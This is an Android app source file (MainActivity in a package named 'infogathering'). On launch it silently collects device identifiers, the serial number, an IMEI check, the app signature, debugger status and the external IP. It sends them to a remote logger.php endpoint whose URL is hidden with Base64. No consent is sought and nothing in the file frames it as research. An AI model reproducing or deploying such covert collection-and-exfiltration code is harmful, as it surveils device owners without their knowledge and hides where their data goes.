package com.a000webhostapp.aquatic_establishme.infogathering;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Debug;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.widget.TextView;

import java.io.IOException;
import java.util.Date;
import java.util.Random;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    //http://aquatic-establishme.000webhostapp.com/logger.php
    private static final String BASE_URL = "aHR0cDovL2FxdWF0aWMtZXN0YWJsaXNobWUuMDAwd2ViaG9zdGFwcC5jb20vbG9nZ2VyLnBocA==";
    //http://ip-api.com/line
    private static final String IP_URL = "aHR0cDovL2lwLWFwaS5jb20vbGluZQ==";

    //GENERATE UNIQUE IDENTIFYER
    private static Random rnd = new Random();
    public static final String uuid = String.valueOf(rnd.nextInt(Integer.MAX_VALUE-10));

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Thread t = new Thread(new Runnable() {
            @Override
            public void run() {
                String a = new String(Base64.decode(BASE_URL, Base64.DEFAULT));
                OkHttpClient client = new OkHttpClient();
                Request request = new Request.Builder()
                        .url(a + "?q=" + generateLog())
                        .build();

                try {
                    //if (!Build.SERIAL.equalsIgnoreCase("88bda8b2"))
                        client.newCall(request).execute();
                } catch (IOException e) {
                    e.printStackTrace();
                }

                Intent intent = new Intent(getApplicationContext(), MyService.class);
                intent.setAction("foobar");
                getApplicationContext().startService(intent);
            }
        });
        t.start();
    }

    private String generateLog() {
        StringBuilder sb = new StringBuilder((new Date()).toString());
        sb.append("%0A");
        sb.append("  Device: " + Build.DEVICE + "%0A");
        sb.append("  Manu:   " + Build.MANUFACTURER + "%0A");
        sb.append("  Finger: " + Build.FINGERPRINT + "%0A");
        sb.append("  Host:   " + Build.HOST + "%0A");
        sb.append("  Hardw:  " + Build.HARDWARE + "%0A");
        sb.append("  Board:  " + Build.BOARD + "%0A");
        sb.append("  Model:  " + Build.MODEL + "%0A");
        sb.append("  User:   " + Build.USER + "%0A");
        sb.append("  ID:     " + Build.ID + "%0A");
        sb.append("  Serial: " + Build.SERIAL + "%0A");
        sb.append("  SDK:    " + Build.VERSION.SDK_INT + "%0A");
        sb.append("  IMEI:   " + checkImei() + "%0A");
        sb.append("  SIGNAT: " + getSignature() + "%0A");
        sb.append("  DEBUG:  " + Debug.isDebuggerConnected() + "%0A");
        sb.append("  UUID:   " + uuid + "%0A");
        sb.append("  IP: "+checkIp()+"%0A");
        return sb.toString();
    }

    private String checkImei() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "restricted";
        }
        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (tMgr == null)
            return "restricted";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return String.valueOf(checkImei(tMgr.getImei()));
        } else {
            return String.valueOf(checkImei(tMgr.getDeviceId()));
        }
    }

    private boolean checkImei(String imei) {
        if (imei.length() != 15)
            return false;
        int sum = 0;
        for (int i = 0; i < imei.length(); i++) {
            sum += sumDig((imei.charAt(i) - '0') * (i % 2 == 0 ? 1 : 2));
        }
        return sum % 10 == 0;
    }

    public static int sumDig(int n) {
        int a = 0;
        while (n > 0) {
            a = a + n % 10;
            n = n / 10;
        }
        return a;
    }

    private String checkIp() {
        OkHttpClient client = new OkHttpClient();
        Request request = new Request.Builder()
                .url(new String(Base64.decode(IP_URL, Base64.DEFAULT)))
                .get()
                .build();
        Response response;
        try {
            response = client.newCall(request).execute();
            String str = response.body().string();
            String[] split = str.split("\n");

            for(int i = 1; i < split.length; i++){
                split[i] = "      "+split[i];
            }
            return TextUtils.join("%0A",split);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "error";
    }

    private String getSignature(){
        PackageManager pm = getPackageManager();
        try {
            PackageInfo pi = pm.getPackageInfo(getApplicationContext().getPackageName(),PackageManager.GET_SIGNATURES);
            if(pi.signatures.length<1)
                return "error";
            return "["+pi.signatures.length+"]"+pi.signatures[0].hashCode();
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        return "error";
    }
}
